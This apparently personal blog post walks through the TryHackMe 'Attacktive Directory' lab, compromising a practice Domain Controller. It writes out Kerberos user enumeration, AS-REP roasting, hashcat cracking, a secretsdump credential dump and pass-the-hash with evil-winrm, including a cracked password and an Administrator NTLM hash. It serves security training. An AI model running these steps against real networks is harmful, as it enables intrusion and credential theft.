---
title: "Attacktive Directory"
date: 2022-03-05 08:00:00 -0400
categories: [red-team]
tags: [red-team,thm]
image:
    path: /assets/img/posts/attacktivedirectory/thumbnail.jpg
--- 

<style>
  .body {
    display:block;
  }
</style>

## Attacktive Directory

In this room we will be using the following tools to compromise a Domain Controller (DC) in order to gain access to the crown jewels of the environment:

**Tools Used:** Nmap, Kerbrute, Impacket, Enum4Linux, Hashcat, SMBClient, and Secretsdump

TryHackMe Link: https://tryhackme.com/room/attackivedirectory

We will begin with an nmap scan to see what ports are open on the host and what services they are running.
```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ nmap -sC -Pn -sV 10.10.121.181
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image1.png" alt=""></p>

Next in our steps to enumerating our host for ports 139/445 we will use the tool enum4linux in order to get very useful information on the domain. For this room we will need to locate the domain name from the output of the tool. Part of the output of this command will give you the answer to the NetBIOS-Domain Name which is THM-AD.
```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ enum4linux -a 10.10.121.181
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image2.png" alt=""></p>

The invalid domain that is typically seen in the Active Directory (AD) domain environments is .local. 

Next we will want to enumerate for valid usernames using the tool userenum.  In order to run this tool we will need to install the tool kerbrute.  To do this we will do the following steps which will require that pip3 and git be installed:

```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ git clone https://github.com/tarlogicsecurity/kerbrute 
Cloning into 'kerbrute' ... 
$ cd kerbrute 
$ pip3 install -r requirements
```

Using the command python3 kerbrute -h we are able to get all the options that this tool has to offer:

```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ python3 kerbrute.py
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image6.png" alt=""></p>


But first we will need the users and password lists that were provided.  To get these we will use the wget command in order to download both the Users List and the Password List

```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image7.png" alt=""></p>

Next, the command that will be used to enumerate valid username is userenum, however the tool does user enumeration by default using the following command:

```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image8.png" alt=""></p>

```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ python3 kerbrute.py -dc-ip 10.10.7.82 -domain spookysec.local -users userlist.txt
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image9.png" alt=""></p>


After running the command you should notice two accounts that are the answer to the next two questions for notable accounts; svc-admin and backup.

The account svc-admin returned “[NOT PREAUTH]” which means we could potentially query a ticket with this account with no password.

In order to request a ticket we will use the impacket tool GetNPUsers.py.  This python 3 file will be located in /usr/share/doc/python3-impacket/examples by default.  The syntax for the command to request the ticket from the AD server is:

```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.121.181
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image10.png" alt=""></p>


You will want to copy and paste the hash into a file for further reference. When navigating to the Hashcat Examples Wiki we see the the Kerberos hash we captured for svc-admin is Kerberos 5 AS-REP etype 23.

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image11.png" alt=""></p>

As shown above in the screenshot from the wiki, the mode that will be used in hashcat is 18200. To crack the password we will use the following command with hashcat:

```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ hashcat svc-admin-hash.txt -a 0 -m 18200 -O passwordlist.txt –force
hashcat (v6.2.5) starting
```

From the output of the hashcat tool we have discovered the the password for the svc-admin account is management2005

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image13.png" alt=""></p>

Next we want to enumerate SMB since we noticed that port 139 was open on our original nmap scan of the server.   This can be done by using the tool smbclient and using the option -L to list the shares using the credentials we just cracked.

```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ smbclient -L \\\\10.10.121.181 -U 'spookysec.local/svc-admin'
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image14.png" alt=""></p>

There are a total of 6 remote shares that the server lists.  We will need to connect to each share to see which one(s) we have access to.  For this machine we have access to the backup share where the file backup_credentials.txt is stored.  We will use the get command to pull this file off the smb share.


```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ smbclient \\\\10.10.121.181\\backup -U 'spookysec.local/svc-admin'
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image15.png" alt=""></p>

When we cat the file we get the contents of the backup_credentials.txt

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image16.png" alt=""></p>

To decode this we will use the command line tool to convert from base64 using the following command

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image17.png" alt=""></p>

The backup account has AD permission that allows all AD changes to be synced with this user account.  We can use the tool secresdump.py to retrieve all password hashes in the AD forest environment. 

```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ python3 secretsdump.py -just-dc-ntlm spookysec.local/backup@10.10.121.181
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image18.png" alt=""></p>

We were able to dump the credentials of the domain users using the DRSUAPI method.  The NTLM hash of the Administrator account is 0e0363213e37b94221497260b0bcb4fc. In order to use these credentials on the system we can attempt to use Pass the Hash.  This means that instead of authentication with a password we can authenticate with the hash of the password.  We will do this by using the tool Evil-WinRM where the option -H allows us to insert the hash of the administrator account.

```shell
(brandon@kali)-[~/thm/attacktivedirectory]
$ evil-winrm -i 10.10.121.181 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image19.png" alt=""></p>

At this point we fully own this box and have administrator on the DC.  To get the flags for svc-admin, backup, and Administrator use commands within the evil-winrm shell to find them.

The Administrator account will have the file root.txt. 

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image20.png" alt=""></p>

The backup account will have the file PrivEsc.txt

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image21.png" alt=""></p>

The svc-admin account will have the file user.txt.txt

<p class="body"><img class="body" src="./assets/img/posts/attacktivedirectory/image22.png" alt=""></p>

If you have made it this far successfully then congrats you have successfully compromised a Domain Controller (DC) and have the crown jewels of the Windows enterprise environment.